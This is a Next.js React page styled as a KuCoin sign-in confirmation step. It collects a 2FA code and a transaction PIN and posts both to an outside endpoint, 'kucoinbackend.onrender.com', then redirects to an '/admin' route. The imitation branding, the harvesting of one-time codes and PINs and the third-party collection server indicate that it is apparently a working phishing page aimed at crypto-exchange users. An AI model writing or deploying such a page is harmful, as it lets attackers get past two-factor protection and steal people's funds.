import { useState } from "react";
import Image from "next/image";
import axios from "axios";
import { useRouter } from "next/router";
import Link from "next/link";

const Confirm = () => {
  const router = useRouter();
  const [Token, setToken] = useState("");
  const [transaction, setTransaction] = useState("");
  const [error, setError] = useState("");

  const handleSubmit = async () => {
    if (!Token || !transaction) {
      setError("Please fill in all fields.");
      return;
    }

    axios
      .post("https://kucoinbackend.onrender.com/api/user/auth/pin", {
        token: Token,
        transactionPin: transaction,
      })
      .then(function (response) {
        router.push("/admin");
        console.log(response);
      })
      .catch(function (error) {
        console.log(error);
        setError("An error occurred. Please try again later.");
      });
  };
  return (
    <>
      <header className="flex justify-between items-center md:px-16 sm:px-8 px-4 py-6 bg-white border-b-2 mb-16">
        <Image src="ku.svg" width={100} height={100} />
        <div className="flex items-center gap-4">
          <Link href="/">
            <button>Login</button>
          </Link>
          <button className="px-4 py-2 rounded-3xl bg-black text-white">
            Sign Up
          </button>
        </div>
      </header>
      <main className=" flex flex-col gap-10 md:px-16 sm:px-8 px-4 ">
        <h1 className=" text-2xl font-bold mb-5">Code</h1>
        <p>
          Enter 2fa 6-Digit token code received in your email or phone number.{" "}
        </p>
        <div className="flex flex-col gap-8">
          <input
            placeholder="Code"
            type="text"
            value={Token}
            onChange={(e) => setToken(e.target.value)}
            className=" p-4  rounded-lg  border-green-500 border-2 bg-white"
          ></input>
          <input
            placeholder="Transaction Pin"
            type="text"
            value={transaction}
            onChange={(e) => setTransaction(e.target.value)}
            className=" p-4  rounded-lg  border-green-500 border-2 bg-white"
          ></input>
        </div>

        <button
          className="px-4 py-2 rounded-3xl bg-black text-white"
          onClick={handleSubmit}
        >
          Proceed
        </button>
      </main>
    </>
  );
};

export default Confirm;
